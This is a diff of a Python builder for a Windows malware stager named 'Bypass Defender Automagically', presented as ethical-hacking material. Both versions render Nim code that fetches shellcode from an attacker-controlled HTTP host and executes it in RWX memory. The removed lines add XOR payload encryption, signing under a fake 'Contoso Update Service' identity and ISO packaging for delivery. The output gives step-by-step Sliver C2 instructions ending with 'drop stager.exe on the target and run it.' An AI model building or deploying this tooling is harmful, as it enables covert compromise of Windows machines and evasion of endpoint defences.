@@ -1,18 +1,10 @@
 #!/usr/bin/env python3
-"""
-Bypass Defender Automagically - hardened Nim stager builder.
-
-  encrypt payload -> render nim -> compile -> strip -> sign -> ISO
-"""
 
 import argparse
 import os
-import random
 import shutil
-import string
 import subprocess
 import sys
-from pathlib import Path
 
 NIM_TEMPLATE = r'''
 import winim/lean
@@ -20,28 +12,16 @@ import httpclient, httpcore, os
 
 let LOG = getTempDir() / "stager.log"
 
-const KEY = "{key}"
-
 proc log(msg: string) =
-  try
-    echo msg
+  try:
     var f = open(LOG, fmAppend)
     f.writeLine(msg)
     f.close()
   except CatchableError:
     discard
 
-proc fatal(msg: string) {{.noreturn.}} =
-  log("[FATAL] " & msg)
-  Sleep(15000)
-  quit(1)
-
 func toByteSeq(s: string): seq[byte] {{.inline.}} =
   @(s.toOpenArrayByte(0, s.high))
-
-proc xorDecode(data: var seq[byte]) {{.inline.}} =
-  for i in 0 ..< data.len:
-    data[i] = data[i] xor byte(KEY[i mod KEY.len])
 
 proc DownloadExecute(url: string): void =
   log("--- start url=" & url)
@@ -54,58 +34,67 @@ proc DownloadExecute(url: string): void =
   try:
     response = client.getContent(url)
   except CatchableError as e:
-    fatal("DOWNLOAD FAILED: " & e.msg)
+    log("DOWNLOAD FAILED: " & e.msg)
+    return
 
   log("downloaded " & $response.len & " bytes")
   if response.len < 1024:
-    fatal("payload too small")
+    log("too small - probably an HTML error page")
+    return
 
   var shellcode: seq[byte] = toByteSeq(response)
-  xorDecode(shellcode)
 
-  let size = cast[SIZE_T](len(shellcode))
-  let rPtr = VirtualAlloc(NULL, size, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
+  let rPtr = VirtualAlloc(NULL, cast[SIZE_T](len(shellcode)),
+                          MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+  log("VirtualAlloc -> 0x" & $cast[uint](rPtr))
   if rPtr == nil:
-    fatal("VirtualAlloc FAILED")
+    log("VirtualAlloc FAILED")
+    return
 
   copyMem(rPtr, unsafeAddr shellcode[0], len(shellcode))
+  log("jumping to shellcode")
 
-  var oldProtect: DWORD
-  if VirtualProtect(rPtr, size, PAGE_EXECUTE_READ, addr oldProtect) == 0:
-    fatal("VirtualProtect FAILED")
-
-  log("executing at 0x" & $cast[uint](rPtr))
   let f = cast[proc() {{.nimcall.}}](rPtr)
   f()
 
-  log("payload returned - holding process alive")
+  log("shellcode RETURNED - holding process alive")
   while true: Sleep(1000)
 
 when defined(windows):
   when isMainModule:
-    DownloadExecute("http://{{ip}}:{{stage_port}}/{payload_path}")
+    DownloadExecute("http://{{ip}}:{{stage_port}}/shellc.bin")
 '''
 
+# Dependency binary -> per-package-manager package name
 DEPS = {
-    "x86_64-w64-mingw32-gcc": {"apt": "mingw-w64", "dnf": "mingw64-gcc",
-                               "pacman": "mingw-w64-gcc", "brew": "mingw-w64"},
-    "x86_64-w64-mingw32-windres": {"apt": "mingw-w64", "dnf": "mingw64-binutils",
-                                   "pacman": "mingw-w64-binutils", "brew": "mingw-w64"},
-    "nim": {"apt": "nim", "dnf": "nim", "pacman": "nim", "brew": "nim"},
+    "x86_64-w64-mingw32-gcc": {
+        "apt": "mingw-w64",
+        "dnf": "mingw64-gcc",
+        "pacman": "mingw-w64-gcc",
+        "brew": "mingw-w64",
+    },
+    "nim": {
+        "apt": "nim",
+        "dnf": "nim",
+        "pacman": "nim",
+        "brew": "nim",
+    },
 }
 
 
 def port_type(value):
+    """argparse type that validates a TCP port number."""
     try:
         port = int(value)
     except ValueError:
         raise argparse.ArgumentTypeError(f"{value!r} is not an integer")
     if not 1 <= port <= 65535:
-        raise argparse.ArgumentTypeError(f"{port} is outside 1-65535")
+        raise argparse.ArgumentTypeError(f"{port} is outside the range 1-65535")
     return port
 
 
 def run_cmd(cmd, description):
+    """Run a shell command, aborting the build on failure."""
     print(f"[*] {description}...")
     print(f"    $ {cmd}")
     try:
@@ -123,123 +112,86 @@ def pkg_manager():
 
 
 def install_cmd(manager, package):
-    return {
-        "apt": f"sudo apt update && sudo apt install -y {package}",
-        "dnf": f"sudo dnf install -y {package}",
-        "pacman": f"sudo pacman -S --noconfirm {package}",
-        "brew": f"brew install {package}",
-    }.get(manager)
+    if manager == "apt":
+        return f"sudo apt update && sudo apt install -y {package}"
+    if manager == "dnf":
+        return f"sudo dnf install -y {package}"
+    if manager == "pacman":
+        return f"sudo pacman -S --noconfirm {package}"
+    if manager == "brew":
+        return f"brew install {package}"
+    return None
 
 
-def check_dependencies(need_signing, need_iso):
+def check_dependencies():
+    """Ensure the cross-compiler and Nim are present, installing if needed."""
     manager = pkg_manager()
-    wanted = dict(DEPS)
-    if need_signing:
-        wanted["osslsigncode"] = {"apt": "osslsigncode", "dnf": "osslsigncode",
-                                  "pacman": "osslsigncode", "brew": "osslsigncode"}
-    if need_iso:
-        wanted["genisoimage"] = {"apt": "genisoimage", "dnf": "genisoimage",
-                                 "pacman": "cdrtools", "brew": "cdrtools"}
 
-    for bin_name, packages in wanted.items():
+    for bin_name, packages in DEPS.items():
         if shutil.which(bin_name):
-            print(f"[+] {bin_name} present.")
+            print(f"[+] {bin_name} is already installed.")
             continue
         print(f"[!] {bin_name} not found.")
         if manager is None:
-            print(f"    install {bin_name} manually, then re-run.")
+            print(f"    No known package manager found - install {bin_name} manually.")
             sys.exit(1)
+
         run_cmd(install_cmd(manager, packages[manager]), f"Installing {bin_name}")
 
 
-def build_resource():
-    """Compile app.rc (icon + version info) if the author supplied one."""
-    if not Path("app.rc").exists():
-        print("[i] no app.rc - binary will have no icon or version info.")
-        return None
-    run_cmd("x86_64-w64-mingw32-windres app.rc -O coff -o app.res",
-            "Compiling version resource")
-    return "app.res"
-
-
-def xor_encrypt(data: bytes, key: str) -> bytes:
-    kb = key.encode()
-    return bytes(b ^ kb[i % len(kb)] for i, b in enumerate(data))
-
-
-def sign(exe: Path):
-    signed = exe.with_name(exe.stem + "-signed.exe")
-    run_cmd(
-        f'osslsigncode sign -certs "signing.crt" -key "signing.key" '
-        f'-n "Contoso Update Service" -i https://contoso.com '
-        f'-h sha256 -ts http://timestamp.digicert.com '
-        f'-in "{exe}" -out "{signed}"',
-        "Signing stager.exe",
-    )
-    os.replace(signed, exe)
-
-
-def make_iso(exe: Path, out: Path):
-    stage = Path("dist")
-    stage.mkdir(exist_ok=True)
-    shutil.copy(exe, stage / exe.name)
-    (stage / "README.txt").write_text(
-        "Contoso Update Service\nRun ContosoUpdate.exe to install.\n")
-    if shutil.which("genisoimage"):
-        run_cmd(f'genisoimage -quiet -J -R -V UPDATE -o "{out}" "{stage}"',
-                f"Building {out}")
-    elif shutil.which("xorriso"):
-        run_cmd(f'xorriso -as mkisofs -quiet -J -R -V UPDATE -o "{out}" "{stage}"',
-                f"Building {out}")
-
-
 def main():
+    help_text = (
+        "Bypass Defender Automagically\n"
+        "Author: Tyler Ramsbey\n"
+        "Learn ethical hacking @ hacksmarter.org"
+    )
+
     parser = argparse.ArgumentParser(
-        description="Bypass Defender Automagically - hardened stager builder",
-        formatter_class=argparse.RawDescriptionHelpFormatter)
-    parser.add_argument("-l", "--ip", required=True, help="reachable listener IP")
+        description=help_text,
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+
+    parser.add_argument("-l", "--ip", required=True,
+                        help="Listener IP/hostname the target can reach")
     parser.add_argument("-p", "--port", required=True, type=port_type,
-                        help="C2 port")
+                        help="Sliver mTLS C2 port")
     parser.add_argument("-s", "--stage-port", type=port_type, default=8000,
-                        help="HTTP staging port (must differ from --port)")
-    parser.add_argument("--payload", help="shellcode file to encrypt and stage")
-    parser.add_argument("--out", default="update.bin", help="encrypted payload name")
-    parser.add_argument("--key", help="XOR key (random 16 chars if omitted)")
-    parser.add_argument("--sign", action="store_true",
-                        help="sign with signing.crt / signing.key via osslsigncode")
-    parser.add_argument("--iso", action="store_true", help="also produce update.iso")
-    parser.add_argument("--console", action="store_true",
-                        help="build with a console window (debugging)")
+                        help="HTTP staging port for shellc.bin "
+                             "(must differ from --port, default: 8000)")
+    parser.add_argument("--gui", action="store_true",
+                        help="Build with no console window (--app:gui)")
     args = parser.parse_args()
 
     if args.stage_port == args.port:
-        print("[!] --port and --stage-port must differ.")
+        print(f"[!] --port and --stage-port are both {args.port}.")
+        print("    The mTLS listener and the HTTP server cannot share a port.")
         sys.exit(1)
 
-    key = args.key or "".join(random.choices(string.ascii_letters + string.digits, k=16))
-    payload_path = f"assets/{args.out}"
+    print(f"[*] C2 (mTLS): {args.ip}:{args.port}")
+    print(f"[*] Staging (HTTP): http://{args.ip}:{args.stage_port}/shellc.bin")
 
-    check_dependencies(args.sign, args.iso)
+    # 1. Toolchain
+    check_dependencies()
+    run_cmd("nimble install -y winim", "Installing winim library")
 
-    if args.payload:
-        data = Path(args.payload).read_bytes()
-        Path(args.out).write_bytes(xor_encrypt(data, key))
-        print(f"[+] encrypted {args.payload} ({len(data)} bytes) -> {args.out}")
-        print(f"[+] key = {key}")
+    # 2. Render the Nim source
+    print(f"[*] Writing stager.nim...")
+    try:
+        source = NIM_TEMPLATE.format(ip=args.ip, stage_port=args.stage_port)
+        with open("stager.nim", "w", newline="\n") as f:
+            f.write(source)
+    except Exception as e:
+        print(f"[!] Failed to render/write stager.nim: {e}")
+        sys.exit(1)
 
-    run_cmd("nimble install -y winim", "Installing winim")
+    # 3. Drop any stale binary so the success check cannot lie
+    if os.path.exists("stager.exe"):
+        os.remove("stager.exe")
 
-    print("[*] Rendering stager.nim...")
-    source = NIM_TEMPLATE.format(ip=args.ip, stage_port=args.stage_port,
-                                 payload_path=payload_path, key=key)
-    Path("stager.nim").write_text(source, newline="\n")
-
-    res = build_resource()
-    Path("stager.exe").unlink(missing_ok=True)
-
+    # 4. Compile
     parts = [
         "nim c",
-        "-d:danger",              # release + no runtime checks, no stack traces
+        "-d:release",
         "--opt:size",
         "-d:mingw",
         "--os:windows",
@@ -247,35 +199,37 @@ def main():
         "--cc:gcc",
         "--gcc.exe:x86_64-w64-mingw32-gcc",
         "--gcc.linkerexe:x86_64-w64-mingw32-gcc",
-        "--passC:-fno-ident",     # drop the GCC version string
-        "--passL:-s",             # strip symbols
-        "--passL:-static",        # no libwinpthread/libgcc DLL dependency
+        "--passL:-s",
     ]
-    if not args.console:
+    if args.gui:
         parts.append("--app:gui")
-    if res:
-        parts.append(f"--passL:{res}")
     parts.append("stager.nim")
 
-    run_cmd(" ".join(parts), "Compiling stager.exe")
+    run_cmd(" ".join(parts), "Compiling stager.nim to Windows EXE")
 
-    if not Path("stager.exe").exists():
-        print("[!] Build failed.")
+    # 5. Result + operator reminders
+    if not os.path.exists("stager.exe"):
+        print("\n[!] Build failed: stager.exe was not produced.")
         sys.exit(1)
 
-    if args.sign:
-        sign(Path("stager.exe"))
-
-    if args.iso:
-        make_iso(Path("stager.exe"), Path("update.iso"))
-
-    size = Path("stager.exe").stat().st_size / 1024
-    print(f"\n[SUCCESS] stager.exe ({size:.0f} KB)")
-    print(f"[*] Serve the payload like this:")
-    print(f"      mkdir -p stage/assets && cp {args.out} stage/assets/")
-    print(f"      cd stage && python3 -m http.server {args.stage_port}")
-    print(f"[*] URL baked into the binary: http://{args.ip}:{args.stage_port}/{payload_path}")
+    size_kb = os.path.getsize("stager.exe") / 1024
+    print("\n" + "=" * 68)
+    print(f"[SUCCESS] stager.exe generated ({size_kb:.0f} KB)")
+    print("=" * 68)
+    print("\n[!] Next steps, in order:\n")
+    print("  1) In your Sliver console, start the mTLS listener:")
+    print(f"       mtls --lport {args.port}\n")
+    print("  2) Generate the shellcode (requires the listener from step 1):")
+    print(f"       generate --mtls {args.ip}:{args.port} --os windows "
+          f"--arch amd64 --format shellcode --save shellc.bin\n")
+    print("  3) Serve the payload on the SEPARATE staging port:")
+    print(f"       python3 -m http.server {args.stage_port} --directory .\n")
+    print("  4) Drop stager.exe on the target and run it.\n")
+    print(f"  Logs land in %TEMP%\\stager.log on the target.")
+    print(f"  Make sure both {args.port} and {args.stage_port} are reachable inbound.")
+    print("=" * 68 + "\n")
 
 
 if __name__ == "__main__":
-    main()
+    main()            
+
